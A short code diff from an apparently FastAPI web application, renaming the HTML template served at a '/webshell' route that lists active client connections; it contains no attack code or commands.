@@ -108,7 +108,7 @@ async def websocket_endpoint(websocket: WebSocket, client_id: int):
 @app.get('/webshell')
 async def webshell(request: Request):
     active_connections = [doc["client_id"] for doc in connections.find()]
-    return templates.TemplateResponse('reverse_shell.html', {'request': request, 'active_connections': active_connections})
+    return templates.TemplateResponse('reverse_shells.html', {'request': request, 'active_connections': active_connections})
 
 @app.get('/webshell/{client_id}')
 async def webshell(request: Request, client_id: int):
